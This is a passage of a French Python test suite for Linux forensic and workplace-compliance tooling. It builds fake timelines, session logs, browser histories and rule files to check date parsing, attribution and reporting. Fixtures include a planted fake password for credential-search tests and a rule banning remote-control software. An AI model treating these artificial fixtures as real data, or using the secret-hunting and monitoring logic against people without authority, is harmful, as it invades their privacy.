         "timestamp_desc": "mtime",
         "filename": "/home/jdupont/Documents/facture.pdf"},
        {"data_type": "fs:stat", "parser": "filestat", "timestamp": (t0 + 1) * US,
         "timestamp_desc": "crtime",
         "display_name": "TSK:/usr/share/doc/ex/facture.pdf"},
        # forme 2 : « date_time.timestamp » en secondes
        {"data_type": "chrome:history:file_downloaded", "parser": "chrome_history",
         "date_time": {"__type__": "DateTimeValues", "timestamp": t0 + 100},
         "timestamp_desc": "Start Time",
         "filename": "/home/jdupont/Documents/facture.pdf"},
        # forme 3 : une chaîne ISO dans « datetime »
        {"data_type": "syslog:line", "parser": "syslog",
         "datetime": "2026-01-05T09:00:00+01:00",
         "timestamp_desc": "Content Modification Time",
         "filename": "/var/log/syslog"},
        # une ligne SANS date reconnue : elle doit être comptée, pas ignorée
        {"data_type": "olecf:item", "parser": "olecf",
         "filename": "/home/jdupont/x.doc"},
    ]
    evts += [{"data_type": "fs:stat", "parser": "filestat",
              "timestamp": (t0 + 200 + i) * US, "timestamp_desc": "crtime",
              "filename": f"/run/media/jdupont/CLE_USB/doc{i}.odt"}
             for i in range(60)]
    with open(os.path.join(r, "PLASO", "PC42_B12_ARTE_ubuntu_plaso.jsonl"),
              "w", encoding="utf-8") as fh:
        for e in evts:
            fh.write(json.dumps(e, ensure_ascii=False) + "\n")
        fh.write("{ceci n'est pas du JSON\n")      # illisible, à compter aussi
    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "plaso.jsonl"))
    pl = [f for f in faits if f["categorie"] == "plaso"]
    recens = next((f for f in pl if "événements dans" in f["fait"]), {})
    yield ("plaso : les trois formes de date sont lues",
           "2026-01-05T08:00:00Z" in str(recens.get("note"))
           and "4 familles" in str(recens.get("note")),
           str(recens.get("note", "AUCUN recensement"))[:70])
    yield ("plaso : le chemin annoncé est attribué",
           any(f["fait"] == "fichier retrouvé dans la super-timeline"
               and f.get("acteur") == "jdupont" for f in pl)
           and any(f["fait"] == "fichier de MÊME NOM dans la super-timeline"
                   and not f.get("acteur") for f in pl),
           "une homonymie n'attribue rien, ici non plus")
    yield ("plaso : le plafond par support se dit",
           any(f["categorie"] == "limite" and "support amovible plaso" in f["fait"]
               for f in faits)
           and sum(1 for f in pl if f["fait"] == "fichier vu sous un support "
                   "amovible") == 40,
           "60 événements sous le point de montage, 40 cités")
    yield ("plaso : les lignes muettes sont comptées",
           any(f["categorie"] == "limite" and f["fait"] == "lignes plaso non exploitées"
               and f.get("valeur") == "2" for f in faits),
           "une illisible, une sans date")

    # ── 6 quater · plaso se trouve même quand le nommage est imparfait ──
    # Un dossier « PLASO/ » et une extension « .jsonl » ne sont PAS garantis :
    # la pièce peut être rangée n'importe où, comprimée, et nommée sans
    # rapport. On ne se fie donc pas au nom — on ouvre la première ligne.
    r = collecte("plaso-sale", "SYSTEME", "COMPTES", "CONNEXIONS", "divers")
    with open(os.path.join(r, "COMPTES", "PC42_B12_ARTE_ubuntu_passwd.txt"),
              "w", encoding="utf-8") as fh:
        fh.write("root:x:0:0::/root:/bin/bash\n"
                 "jdupont:x:1000:1000::/home/jdupont:/bin/bash\n")

    with open(os.path.join(r, "CONNEXIONS", "wtmp"), "wb") as fh:
        fh.write(utmp([(7, 900, "tty1", "jdupont", "", "2026-01-05T09:00:00"),
                       (8, 900, "tty1", "", "", "2026-01-05T18:00:00")]))
    ev = []
    ev += [{"data_type": "fs:stat", "parser": "filestat",
            "timestamp": (epoch("2026-01-05T10:00:00") + i * 60) * US,
            "timestamp_desc": "mtime",
            "filename": f"/home/jdupont/Documents/note{i}.odt"} for i in range(25)]
    # HORS de la fenêtre de session : ils ne doivent pas y être comptés
    ev += [{"data_type": "fs:stat", "parser": "filestat",
            "timestamp": (epoch("2026-01-05T03:00:00") + i) * US,
            "timestamp_desc": "crtime", "filename": "/var/lib/x"}
           for i in range(5)]
    # après un TROU de plus de six semaines, chez root
    ev += [{"data_type": "syslog:line", "parser": "syslog",
            "timestamp": (epoch("2026-02-20T12:00:00") + i) * US,
            "timestamp_desc": "Content Modification Time",
            "filename": "/root/.bash_history"} for i in range(3)]
    # nom quelconque, comprimé, hors de tout dossier « PLASO »
    with gzip.open(os.path.join(r, "divers", "extraction-complete-2026.json.gz"),
                   "wt", encoding="utf-8") as fh:
        for e in ev:
            fh.write(json.dumps(e, ensure_ascii=False) + "\n")
    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "plaso-sale.jsonl"))
    pl = [f for f in faits if f["categorie"] == "plaso"]
    yield ("plaso : trouvé malgré le nommage",
           any("événements dans" in f["fait"] and f.get("valeur") == "33"
               for f in pl),
           "ni dossier PLASO, ni extension .jsonl, et comprimé")
    sess = next((f for f in pl if "pendant une session" in f["fait"]), {})
    yield ("plaso : recoupé avec la session",
           sess.get("valeur") == "25" and sess.get("acteur") == "jdupont",
           f"{sess.get('valeur')} événements dans la fenêtre "
           "(les 5 de 03:00 sont dehors)")
    # LE MÊME, sur un poste qui n'est pas en UTC. La fenêtre de session
    # glissait d'un fuseau — une heure en France, treize à Auckland — parce
    # qu'un datetime naïf, déjà en UTC, était reconverti comme s'il était
    # local. Aucun test ne le voyait : ils tournent tous en UTC.
    _, ftz = tourner(EXTRAIRE, r, os.path.join(coin, "plaso-tz.jsonl"),
                     env=dict(os.environ, TZ="Pacific/Auckland"))
    stz = next((x for x in ftz if "pendant une session" in x["fait"]), {})
    yield ("plaso : la session ne glisse pas d'un fuseau",
           stz.get("valeur") == sess.get("valeur")
           and stz.get("horodatage") == sess.get("horodatage"),
           f"UTC : {sess.get('valeur')} à {sess.get('horodatage')} ; "
           f"Auckland : {stz.get('valeur')} à {stz.get('horodatage')}")
    # Une session LONGUE qui en couvre une courte. Le bisect atterrit sur la
    # courte, déjà fermée, et il faut redescendre jusqu'à la longue. C'est le
    # cas que le contrôle « fins_max » — celui qui évite de balayer toutes les
    # sessions pour un événement qu'aucune ne couvre — ne doit PAS court-
    # circuiter : trop pressé, il perdrait la pièce sans un mot.
    r2 = collecte("plaso-sessions-imbriquees", "COMPTES", "CONNEXIONS", "PLASO")
    with open(os.path.join(r2, "COMPTES", "PC42_B12_ARTE_ubuntu_passwd.txt"),
              "w", encoding="utf-8") as fh:
        fh.write("jdupont:x:1000:1000::/home/jdupont:/bin/bash\n"
                 "marie:x:1001:1001::/home/marie:/bin/bash\n")
    with open(os.path.join(r2, "CONNEXIONS", "wtmp"), "wb") as fh:
        fh.write(utmp([(7, 900, "tty1", "jdupont", "", "2026-01-05T09:00:00"),
                       (7, 901, "pts/0", "marie", "", "2026-01-05T10:00:00"),
                       (8, 901, "pts/0", "", "", "2026-01-05T10:05:00"),
                       (8, 900, "tty1", "", "", "2026-01-05T18:00:00")]))
    with open(os.path.join(r2, "PLASO", "PC42_B12_ARTE_ubuntu_plaso.jsonl"),
              "w", encoding="utf-8") as fh:
        for i in range(7):                  # 12:00 : dans jdupont seul
            fh.write(json.dumps({
                "data_type": "fs:stat", "parser": "filestat",
                "timestamp": (epoch("2026-01-05T12:00:00") + i) * US,
                "timestamp_desc": "mtime",
                "filename": f"/home/jdupont/n{i}.odt"}) + "\n")
        for i in range(4):                  # après TOUTE session : dehors
            fh.write(json.dumps({
                "data_type": "fs:stat", "parser": "filestat",
                "timestamp": (epoch("2026-01-06T23:00:00") + i) * US,
                "timestamp_desc": "mtime", "filename": "/var/lib/y"}) + "\n")
    _, f2 = tourner(EXTRAIRE, r2, os.path.join(coin, "plaso-imbrique.jsonl"))
    couvre = {x.get("acteur"): x.get("valeur") for x in f2
              if "pendant une session" in x["fait"]}
    yield ("plaso : la session qui ENGLOBE est retrouvée",
           couvre == {"jdupont": "7"},
           f"{couvre or 'AUCUNE'} — la courte est fermée, les 4 du 6 sont hors "
           "de tout")

    maisons = {f.get("acteur"): f.get("valeur") for f in pl
               if "dossier personnel" in f["fait"]}
    yield ("plaso : recoupé avec les comptes",
           maisons == {"jdupont": "25", "root": "3"},
           f"{maisons or 'AUCUN'}")
    # Le trou prend le schéma que le brouillon tabule DÉJÀ — catégorie
    # « periode », avec jours/depuis/jusqu — sans quoi il serait produit,
    # compté au manifeste, et invisible au rapport.
    trou = next((f for f in faits if f["categorie"] == "periode"
                 and "super-timeline" in f["fait"]), {})
    yield ("plaso : le trou entre dans le tableau des périodes",
           trou.get("jours") == 46 and trou.get("valeur") == "2026-01-05 → 2026-02-20",
           f"{trou.get('jours')} jours, {trou.get('valeur')}")

    # ── 6 quinquies · les unités de dfdatetime ──
    # Un plaso récent sérialise « date_time » comme un objet dfdatetime, dont le
    # « __class_name__ » dit L'UNITÉ. La supposer en secondes n'est vrai que
    # pour PosixTime : pour PosixTimeInMicroseconds cela levait une ValueError
    # « year 56014984 is out of range », non rattrapée, qui emportait la PHASE
    # ENTIÈRE. Une date fausse dans un rapport est pire encore qu'une absence.
    for classe, ts in (("PosixTime", t0),
                       ("PosixTimeInMicroseconds", t0 * US),
                       ("PosixTimeInMilliseconds", t0 * 10 ** 3),
                       ("JavaTime", t0 * 10 ** 3)):
        vu = extraire._plaso_horo({"date_time": {"__class_name__": classe,
                                                 "timestamp": ts}})
        yield (f"plaso : l'unité {classe[:22]}", vu == "2026-01-05T08:00:00Z",
               f"lu {vu}")
    yield ("plaso : une date aberrante n'est pas publiée",
           extraire._plaso_horo({"timestamp": 99999999999999999999}) is None,
           "hors des bornes, c'est une unité mal devinée — pas une date")
    # Et le rapport DIT ce qu'il a lu, pour qu'on puisse le vérifier.
    r3 = collecte("plaso-dfdatetime", "PLASO")
    with open(os.path.join(r3, "PLASO", "plaso.jsonl"), "w", encoding="utf-8") as fh:
        for i in range(4):
            fh.write(json.dumps({
                "__container_type__": "event", "data_type": "fs:stat",
                "parser": "filestat", "timestamp_desc": "mtime",
                "date_time": {"__class_name__": "PosixTimeInMicroseconds",
                              "timestamp": (t0 + i) * US},
                "filename": f"/home/jdupont/x{i}.odt"}) + "\n")
    _, f3 = tourner(EXTRAIRE, r3, os.path.join(coin, "plaso-df.jsonl"))
    forme = next((x for x in f3 if x["fait"] == "forme du fichier plaso"), {})
    recens = next((x for x in f3 if "événements dans" in x["fait"]), {})
    yield ("plaso : la forme lue est publiée",
           forme.get("valeur") == "PosixTimeInMicroseconds"
           and "2026-01-05T08:00:00Z" in str(recens.get("note")),
           f"classe dite : {forme.get('valeur')}")

    # Ce qui n'est PAS du plaso ne doit pas être pris pour tel : la collecte
    # porte du JSON qui n'en est pas — snapd, nos propres sorties.
    r2 = collecte("plaso-faux", "PERSISTANCE")
    with open(os.path.join(r2, "PERSISTANCE", "state.json"), "w",
              encoding="utf-8") as fh:
        fh.write(json.dumps({"data": {"snaps": {"firefox": {"revision": "1"}}}}))
    _, f2 = tourner(EXTRAIRE, r2, os.path.join(coin, "plaso-faux.jsonl"))
    yield ("plaso : un JSON qui n'en est pas est écarté",
           not any(f["categorie"] == "plaso" for f in f2),
           "state.json de snapd n'est pas une super-timeline")

    # ── 7 · une correspondance à cheval sur deux blocs : comptée UNE fois ──
    # La déduplication se faisait sur la FIN de la correspondance, qui bouge
    # dès que le motif a une queue gourmande — six des onze motifs d'INTERETS.
    # Tranchée par la fin du tampon puis rallongée au tour suivant, la même
    # occurrence était comptée deux fois ET citée tronquée, sans « … » : le
    # rapport montrait « password=SuperMotDe » comme un mot de passe entier.
    secret = b"password=SuperMotDePasse2024\n"
    temoins = []
    for nom, avant in (("frontiere", 1048576 - 19), ("loin", 1000)):
        r = collecte("cheval-" + nom, "STRINGS")
        with open(os.path.join(r, "STRINGS",
                               "PC42_B12_ARTE_ubuntu_strings_sda1.txt"), "wb") as fh:
            fh.write(b"." * avant + secret + b"." * 4096)
        _, faits = tourner(EXTRAIRE, r, os.path.join(coin, f"cheval-{nom}.jsonl"))
        temoins.append(next((f for f in faits if f["categorie"] == "interet"), {}))
    a_cheval, temoin = temoins
    yield ("à cheval : comptée une seule fois",
           a_cheval.get("occurrences") == temoin.get("occurrences") == 1,
           f"{a_cheval.get('occurrences')} à la frontière du bloc, "
           f"{temoin.get('occurrences')} loin d'elle")
    yield ("à cheval : le secret n'est pas tronqué",
           "SuperMotDePasse2024" in a_cheval.get("contexte", ""),
           "citer « password=SuperMotDe » serait citer une chose qui n'existe pas")

    # ── 8 · conformité : pas de navigateur ≠ phase « usage » vide ──
    # Absente était levée hors du filet d'appliquer_regles et emportait les
    # supports amovibles, qui n'ont pourtant rien à voir avec les navigateurs.
    r = collecte("sans-navigateur", "JOURNAUX")
    with open(os.path.join(r, "JOURNAUX", "PC42_B12_ARTE_ubuntu_journal.txt"),
              "w", encoding="utf-8") as fh:
        fh.write("Jan  5 09:00:00 pc42 udisksd[700]: Mounted /run/media/jdupont/CLE_USB\n")
    _, cs = tourner(CONTROLES, r, os.path.join(coin, "sans-navigateur.jsonl"))
    yield ("sans navigateur : le support amovible sort",
           any(c["constat"] == "support amovible monté" for c in cs),
           "la recherche par domaine ne doit pas emporter le reste de la phase")


def fausses_accusations(base):
    """Un constat de conformité met en cause QUELQU'UN. Trois façons dont il
    le faisait à tort, toutes mesurées sur le code d'avant."""
    coin = os.path.join(base, "accusations")
    REGLES_LIVREES = os.path.join(SKILLS, "conformite-linux", "references",
                                  "regles", "usage-non-professionnel.regles")
    collecte = functools.partial(coin_collecte, coin)

    def profil(racine, octets):
        poser_tar_gz(os.path.join(racine, "COMPTES",
                                  "PC42_B12_ARTE_ubuntu_jdupont_profils.tar.gz"),
                     [("home/jdupont/.mozilla/firefox/ab.default/places.sqlite",
                       octets)])

    # ── 1 · un domaine reconnu dans le CHEMIN d'une URL ──
    # RE_HOTE garde jusqu'à 120 caractères de chemin, et le motif de la règle
    # courait sur le tout. Une page d'intranet professionnel nommée
    # « netflix.etude-de-cas.pdf » sortait « domaine présent dans une base de
    # navigateur » au nom de la règle « streaming au travail ».
    r = collecte("domaine-chemin", "COMPTES")
    profil(r, b"\x00https://intranet.societe.example/docs/netflix.etude-de-cas.pdf\x00")
    regle = os.path.join(coin, "streaming.regles")
    with open(regle, "w", encoding="utf-8") as fh:
        fh.write("regle: R03\ntitre: streaming au travail\n"
                 "texte: Les services de streaming sont interdits.\n"
                 "theme: usage\ndomaine: netflix[.]\n")
    _, cs = tourner(CONTROLES, r, os.path.join(coin, "domaine-chemin.jsonl"), "--regles", regle)
    yield ("domaine dans le chemin : aucune accusation",
           not any(c.get("regle") == "R03" and c["theme"] == "usage" for c in cs),
           "un nom de fichier n'est pas un domaine visité")

    # Mais plusieurs règles LIVRÉES visent le chemin exprès — « amazon\.fr/gp »
    # distingue l'achat de la simple mention. Elles doivent continuer de mordre.
    r = collecte("domaine-ancre", "COMPTES")
    profil(r, b"\x00https://www.amazon.fr/gp/cart/view.html\x00https://x.com/home\x00")
    _, cs = tourner(CONTROLES, r, os.path.join(coin, "domaine-ancre.jsonl"),
                 "--regles", REGLES_LIVREES)
    vus = {c.get("valeur") for c in cs if c["constat"].startswith("domaine")}
    yield ("domaine ancré sur l'hôte : toujours vu",
           {"amazon.fr/gp", "x.com/home"} <= vus,
           "les règles livrées qui visent le chemin gardent leur effet")

    # ── 2 · un paquet RETIRÉ annoncé comme installé ──
    # L'historique du gestionnaire garde les poses ET les retraits. Le constat
    # annonçait « programme installé sur le poste » en citant la ligne
    # « Commandline: apt remove teamviewer », alors que la liste des paquets
    # installés ne le portait plus.
    r = collecte("paquet-retire", "PAQUETS")
    with open(os.path.join(r, "PAQUETS", "PC42_B12_ARTE_ubuntu_paquets.txt"),
              "w", encoding="utf-8") as fh:
        fh.write("openssh-server\nvim\n")
    hist = (b"Start-Date: 2024-03-01  10:00:00\n"
            b"Commandline: apt remove teamviewer\n"
            b"Remove: teamviewer:amd64 (15.40.8)\n")
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        ti = tarfile.TarInfo("history.log")
        ti.size = len(hist)
        tf.addfile(ti, io.BytesIO(hist))
    with open(os.path.join(r, "PAQUETS",
                           "PC42_B12_ARTE_ubuntu_historique.tar.gz"), "wb") as fh:
        fh.write(gzip.compress(buf.getvalue()))
    regle = os.path.join(coin, "distant.regles")
    with open(regle, "w", encoding="utf-8") as fh:
        fh.write("regle: R05\ntitre: prise en main a distance\n"
                 "texte: Les outils de prise en main a distance sont interdits.\n"
                 "theme: usage\nprogramme: teamviewer\n")
    _, cs = tourner(CONTROLES, r, os.path.join(coin, "paquet-retire.jsonl"), "--regles", regle)
    dits = [c["constat"] for c in cs if c.get("valeur") == "teamviewer"]
    yield ("paquet retiré : jamais dit « installé »",
           dits and not any("installé sur le poste" in d for d in dits),
           f"le constat dit : « {dits[0] if dits else 'AUCUN'} »")

    # ── 3 · la timeline n'attribue pas un fichier sur une HOMONYMIE ──
    # « facture.pdf » téléchargé par jdupont et « facture.pdf » sous
    # /usr/share/doc portent le même nom et n'ont rien à voir. Le fait sortait
    # pourtant « fichier retrouvé sur le disque », confiance CERTAINE, avec
    # jdupont pour acteur : le rapport attribuait un fichier à quelqu'un sur un
    # nom. Le chemin complet est pourtant dans le fait demandeur.
    telech = os.path.join(coin, "History")
    cx = sqlite3.connect(telech)
    cx.executescript(
        "CREATE TABLE downloads(id INTEGER, start_time INTEGER, "
        "target_path TEXT, tab_url TEXT);"
        "INSERT INTO downloads VALUES(1, 13350000000000000, "
        "'/home/jdupont/Documents/facture.pdf', 'https://fournisseur.example/f');")
    cx.commit()
    cx.close()
    with open(telech, "rb") as fh:
        blob = fh.read()
    for nom, chemin_timeline, attendu in (
            ("homonyme", "/usr/share/doc/exemple/facture.pdf", False),
            ("le bon",   "/home/jdupont/Documents/facture.pdf", True)):
        r = collecte("timeline-" + nom.replace(" ", "-"), "COMPTES", "TIMELINE")
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            ti = tarfile.TarInfo("home/jdupont/.config/google-chrome/Default/History")
            ti.size = len(blob)
            tf.addfile(ti, io.BytesIO(blob))
        with open(os.path.join(r, "COMPTES",
                               "PC42_B12_ARTE_ubuntu_jdupont_profils.tar.gz"),
                  "wb") as fh:
            fh.write(gzip.compress(buf.getvalue()))
        with open(os.path.join(r, "TIMELINE", "PC42_B12_ARTE_ubuntu_mactime.csv"),
                  "w", encoding="utf-8") as fh:
            fh.write("Date,Size,Type,Mode,UID,GID,Meta,File Name\n"
                     "Mon Mar 04 2024 10:00:00,120,m...,r/rrr,0,0,4242,"
                     + chemin_timeline + "\n")
        sortie = os.path.join(coin, f"timeline-{nom}.jsonl")
        subprocess.run([sys.executable, EXTRAIRE, r, "-o", sortie],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with open(sortie, encoding="utf-8") as fh:
            fs = [json.loads(l) for l in fh if l.strip()]
        pris = [x for x in fs if x["categorie"] == "timeline"
                and "facture.pdf" in str(x.get("valeur", ""))]
        attribue = any(x.get("acteur") and x.get("confiance") == "certaine"
                       for x in pris)
        yield (f"timeline « {nom} » : attribué = {attendu}",
               bool(pris) and attribue == attendu,
               "le chemin complet est dans le fait demandeur : il faut l'exiger")

    # ── 3 bis · un plafond de citation ne mord pas en silence ──
    # Trente homonymes précédaient le VRAI fichier dans la timeline : les trois
    # premiers emplacements étaient cités, le bon était évincé, et la note
    # annonçait « 3 emplacements portent ce nom » quand il y en avait 31. Le
    # fichier réellement téléchargé par le compte n'apparaissait donc nulle
    # part. En dessous, 400 chemins sensibles pour un plafond de 300, sans un
    # mot.
    r = collecte("plafonds", "COMPTES", "TIMELINE")
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        ti = tarfile.TarInfo("home/jdupont/.config/google-chrome/Default/History")
        ti.size = len(blob)
        tf.addfile(ti, io.BytesIO(blob))
    with open(os.path.join(r, "COMPTES",
                           "PC42_B12_ARTE_ubuntu_jdupont_profils.tar.gz"), "wb") as fh:
        fh.write(gzip.compress(buf.getvalue()))
    lignes = ["Date,Size,Type,Mode,UID,GID,Meta,File Name"]
    lignes += [f"Mon Mar 04 2024 10:00:00,120,m...,r/rrr,0,0,{1000 + i},"
               f"/usr/share/doc/p{i}/facture.pdf" for i in range(30)]
    lignes.append("Mon Mar 04 2024 11:00:00,120,m...,r/rrr,1000,1000,4242,"
                  "/home/jdupont/Documents/facture.pdf")
    lignes += [f"Mon Mar 04 2024 12:00:00,10,m...,r/rrr,0,0,{9000 + i},"
               f"/root/secret{i}.txt" for i in range(400)]
    with open(os.path.join(r, "TIMELINE", "PC42_B12_ARTE_ubuntu_mactime.csv"),
              "w", encoding="utf-8") as fh:
        fh.write("\n".join(lignes) + "\n")
    sortie = os.path.join(coin, "plafonds.jsonl")
    subprocess.run([sys.executable, EXTRAIRE, r, "-o", sortie],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    with open(sortie, encoding="utf-8") as fh:
        fs = [json.loads(l) for l in fh if l.strip()]
    yield ("plafond : le bon chemin n'est pas évincé",
           any(x["categorie"] == "timeline" and x.get("acteur") == "jdupont"
               and x.get("confiance") == "certaine"
               and str(x.get("valeur", "")).startswith("/home/jdupont/") for x in fs),
           "il arrivait 31e, derrière trente homonymes")
    yield ("plafond : le compte annoncé est le vrai",
           any("31 emplacements" in str(x.get("note", "")) for x in fs),
           "« 3 emplacements » quand il y en a 31 est un compte faux")
    yield ("plafond : la coupe se dit",
           any(x["categorie"] == "limite" and "plafond de citation" in x["fait"]
               for x in fs),
           "un plafond tu se lit comme une absence")

    # ── 4 · une règle SANS indice n'est pas « conforme » ──
    # C'est un acquittement prononcé sans instruction : la règle n'a jamais été
    # cherchée, et « conforme » est justement ce que le décompte des manquements
    # écarte.
    r = collecte("regle-muette", "PAQUETS")
    with open(os.path.join(r, "PAQUETS", "PC42_B12_ARTE_ubuntu_paquets.txt"),
              "w", encoding="utf-8") as fh:
        fh.write("vim\n")
    regle = os.path.join(coin, "muette.regles")
    with open(regle, "w", encoding="utf-8") as fh:
        fh.write("regle: R04\ntitre: chiffrement du disque\n"
                 "texte: Le disque d un poste nomade doit etre chiffre.\n"
                 "theme: durcissement\n")
    _, cs = tourner(CONTROLES, r, os.path.join(coin, "regle-muette.jsonl"), "--regles", regle)
    themes = {c["theme"] for c in cs if c.get("regle") == "R04"}
    yield ("règle sans indice : jamais « conforme »",
           "conforme" not in themes and "limite" in themes,
           f"thème posé : {', '.join(sorted(themes)) or 'AUCUN'}")


def ce_que_le_rapport_montre(base):
    """Le rapport est ce que l'analyste lit. Trois façons dont il disait faux."""
    import importlib.util

    sys.path.insert(0, os.path.join(SKILLS, "forensic-linux", "scripts"))
    spec = importlib.util.spec_from_file_location(
        "brouillon_f", os.path.join(SKILLS, "forensic-linux", "scripts", "brouillon.py"))
    brouillon = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(brouillon)

    # ── 1 · un masque de sous-réseau n'est pas une adresse publique ──
    # « 255.255.255.0 » est dans chaque fichier de configuration réseau : quatre
    # octets valides, hors des plages privées, hors multidiffusion. La synthèse
    # le rangeait en « publique », c'est-à-dire « un contact vers l'extérieur ».
    masques = {v: extraire._portee_ip(v) for v in
               ("255.255.255.0", "255.255.0.0", "255.0.0.0", "240.1.2.3", "0.0.0.1")}
    yield ("masque de sous-réseau : pas une adresse",
           not any(masques.values()),
           ", ".join(f"{v}→{p}" for v, p in masques.items() if p) or "aucun classé")
    vraies = {v: extraire._portee_ip(v) for v in
              ("8.8.8.8", "10.0.0.9", "192.168.1.1", "169.254.1.1")}
    yield ("les vraies adresses gardent leur portée",
           vraies["8.8.8.8"] == "publique" and vraies["10.0.0.9"] == "privée"
           and vraies["192.168.1.1"] == "privée"
           and vraies["169.254.1.1"].startswith("auto"),
           "la correction ne doit pas coûter un faux négatif")

    # ── 2 · une case de tableau ne casse pas la ligne ──
    # « \\| » était échappé en « \\\\| » : l'antislash protégé, et la barre
    # redevenue SÉPARATEUR. La ligne se coupait en deux et toutes les colonnes
    # qui suivent se décalaient.
    lignes = brouillon.tableau(["valeur", "note"],
                               [["C:" + chr(92), "fin"],
                                ["a" + chr(92) + "|b", "fin"],
                                ["x|y", "fin"]]).splitlines()
    def barres(ligne):
        """Les barres qui SÉPARENT vraiment, au sens de Markdown : celles que
        ne précède pas un nombre impair d'antislashs."""
        n = i = 0
        while i < len(ligne):
            if ligne[i] == chr(92):
                i += 2
                continue
            n += ligne[i] == "|"
            i += 1
        return n

    corps = [l for l in lignes if l.startswith("| ")][2:]
    bonnes = all(barres(l) == 3 for l in corps)
    yield ("tableau : la ligne garde ses trois barres", bonnes,
           "un antislash en fin de valeur mangeait la barre fermante")

    # ── 2 bis · un fait produit qui n'atteint pas le rapport n'existe pas ──
    # Toute la lecture de la super-timeline était produite, comptée au
    # manifeste, et INVISIBLE : « plaso » n'apparaissait pas une seule fois
    # dans brouillon.py. Un fait que le rapport ne montre pas n'a servi à
    # personne.
    # On pose la question au RAPPORT, pas au code source. Chercher la chaîne
    # « plaso » dans brouillon.py passait dès qu'elle figurait dans un tuple,
    # un commentaire ou une docstring — et restait verte si tout le bloc était
    # supprimé. La propriété qui compte est : une catégorie PRODUITE cite au
    # moins un de ses identifiants dans le rapport. Elle vaut pour les
    # catégories futures sans qu'on pense à allonger une liste.
    with open(os.path.join(base, "faits.jsonl"), encoding="utf-8") as fh:
        produits = [json.loads(l) for l in fh if l.strip()]
    with open(os.path.join(base, "rapport-forensic.md"), encoding="utf-8") as fh:
        rapport = fh.read()
    lues = {f["categorie"] for f in produits if f["id"] in rapport}
    orphelines = sorted({f["categorie"] for f in produits} - lues)
    yield ("toute catégorie de fait atteint le rapport", not orphelines,
           f"produites mais absentes : {', '.join(orphelines)}" if orphelines
           else f"{len(lues)} catégories, toutes citées")

    # ── 3 · §2 n'invente pas de comptes à partir des adresses de courriel ──
    # La valeur du fait est l'ADRESSE, pas le nom du compte : le tableau des
    # comptes s'ouvrait sur « jean.dupont@entreprise.fr | 0 session | — | — ».
    section = rapport.split("## 2 · Les comptes", 1)[-1].split("## 3", 1)[0]
    tableau_comptes = section.split("**Ce qui est propre", 1)[0]
    inventes = [l.split("|")[1].strip() for l in tableau_comptes.splitlines()
                if l.startswith("| ") and "@" in l.split("|")[1]]
    yield ("§2 : aucun compte inventé", not inventes,
           ", ".join(inventes) if inventes else
           "le fait porte le vrai compte dans son champ acteur")


def main():
    base = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else "artefacts")
    shutil.rmtree(base, ignore_errors=True)
    os.makedirs(base)
    R = batir(base)
    regles = os.path.join(SKILLS, "conformite-linux", "references", "regles",
                          "usage-non-professionnel.regles")
    faits = os.path.join(base, "faits.jsonl")
    constats = os.path.join(base, "constats.jsonl")
    subprocess.run([sys.executable, os.path.join(SKILLS, "forensic-linux", "scripts", "extraire.py"),
                    R, "-o", faits, "--indicateurs", os.path.join(base, "indicateurs.txt")],
                   check=True, stdout=subprocess.DEVNULL)
    subprocess.run([sys.executable, os.path.join(SKILLS, "conformite-linux", "scripts", "controles.py"),
                    R, "--regles", regles, "--faits", faits, "-o", constats],
                   check=True, stdout=subprocess.DEVNULL)
    for script, entree, sortie in (
            ("forensic-linux", faits, os.path.join(base, "rapport-forensic.md")),
            ("conformite-linux", constats, os.path.join(base, "rapport-conformite.md"))):
        cmd = [sys.executable, os.path.join(SKILLS, script, "scripts", "brouillon.py"),
               entree, "-o", sortie]
        if script == "conformite-linux":
            cmd += ["--faits", faits]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    manques = 0
    for titre, fichier, cle, attendus in (
            ("FAITS", faits, "fait", ATTENDUS_FAITS),
            ("CONSTATS", constats, "constat", ATTENDUS_CONSTATS)):
        vus = lire(fichier, cle)
        print(f"\n── {titre} ({len(vus)} libellés distincts) ──")
        for artefact, attendu in attendus:
            ok = attendu in vus
            manques += not ok
            print(f"  {'ok ' if ok else 'MANQUE'}  {artefact:28s} {attendu}")
    # Un plantage à la fin d'un parcours de plusieurs heures ne doit pas coûter
    # les heures. On coupe donc le journal en plein milieu d'une ligne — ce que
    # fait un plantage réel — et on exige que la reprise rende EXACTEMENT le
    # même fichier de faits qu'un passage d'un seul tenant. Sans cette
    # égalité, la reprise ne serait pas une reprise : ce serait une autre
    # analyse, avec d'autres identifiants.
    print("\n── DÉCOMPRESSION BORNÉE ──")
    for artefact, ok, detail in blocs_bornes():
        manques += not ok
        print(f"  {'ok ' if ok else 'MANQUE'}  {artefact:28s} {detail}")

    print("\n── PIÈCES ABÎMÉES : LE TROU SE DIT ──")
    for artefact, ok, detail in pieces_abimees(base):
        manques += not ok
        print(f"  {'ok ' if ok else 'MANQUE'}  {artefact:38s} {detail}")

    print("\n── CE QU'UN CONSTAT NE DOIT PAS DIRE ──")
    for artefact, ok, detail in fausses_accusations(base):
        manques += not ok
        print(f"  {'ok ' if ok else 'MANQUE'}  {artefact:38s} {detail}")

    print("\n── CE QUE LE RAPPORT MONTRE ──")
    for artefact, ok, detail in ce_que_le_rapport_montre(base):
        manques += not ok
        print(f"  {'ok ' if ok else 'MANQUE'}  {artefact:38s} {detail}")

    print("\n── REPRISE APRÈS PLANTAGE ──")
    journal = os.path.splitext(faits)[0] + "-reprise.jsonl"
    complet = open(faits, encoding="utf-8").read()
    lignes = open(journal, encoding="utf-8").read().splitlines(keepends=True)
    with open(journal, "w", encoding="utf-8") as fh:
        fh.writelines(lignes[:max(1, len(lignes) // 2)])
        fh.write('{"chemin": "coupé par le plant')      # ligne tronquée
    repris = os.path.join(base, "faits-repris.jsonl")
    subprocess.run([sys.executable, os.path.join(SKILLS, "forensic-linux", "scripts", "extraire.py"),
                    R, "-o", repris, "--indicateurs", os.path.join(base, "indicateurs.txt")],
                   check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
